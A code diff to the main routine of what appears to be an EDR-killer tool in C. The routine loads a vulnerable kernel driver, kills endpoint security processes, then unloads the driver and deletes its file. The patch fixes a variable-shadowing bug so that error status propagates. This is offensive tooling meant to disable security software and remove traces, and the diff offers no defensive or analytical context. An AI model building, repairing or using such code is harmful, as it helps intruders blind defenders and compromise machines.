@@ -22,7 +22,7 @@ int main() {
 	infoW(L"LoadDriver - Loading vulnerable driver from \"%s\" with name \"%s\"", szVulnDriverPath, g_VULNDRIVERNAME);
 	if (!LoadDriver(g_VULNDRIVERNAME, szVulnDriverPath)) {
 		error("LoadDriver - Failed to load driver");
-		BOOL bSTATE = FALSE;
+		bSTATE = FALSE;
 		goto _cleanUp;
 	}
 	okayW("LoadDriver - Loaded vulnerable driver, servicename: \"%s\"", g_VULNDRIVERNAME);
@@ -32,7 +32,7 @@ int main() {
 	infoW(L"KillEdrProcesses - Looping over the EDR processes and killing them");
 	if (!KillEdrProcesses()) {
 		error("KillEdrProcesses - Failed");
-		BOOL bSTATE = FALSE;
+		bSTATE = FALSE;
 		goto _cleanUp;
 	}
 	okayW("KillEdrProcesses - Completed");
@@ -46,7 +46,7 @@ _cleanUp:
 	infoW(L"UnloadDriver - Unloading vulnerable driver \"%s\"", g_VULNDRIVERNAME);
 	if (!UnloadDriver(g_VULNDRIVERNAME)) {
 		error("UnloadDriver - Failed to unload driver");
-		BOOL bSTATE = FALSE;
+		bSTATE = FALSE;
 	}
 	okayW("UnloadDriver - Unloaded vulnerable driver \"%s\"", g_VULNDRIVERNAME);
 	printf("\n");
@@ -55,7 +55,7 @@ _cleanUp:
 	infoW(L"RemoveFileW - Vulnerable driver \"%s\"", szVulnDriverPath);
 	if (!RemoveFileW(szVulnDriverPath)) {
 		error("RemoveFileW - Failed to delete file");
-		BOOL bSTATE = FALSE;
+		bSTATE = FALSE;
 	}
 	okayW("RemoveFileW - Deleted vulnerable driver \"%s\"", szVulnDriverPath);
 	printf("\n");
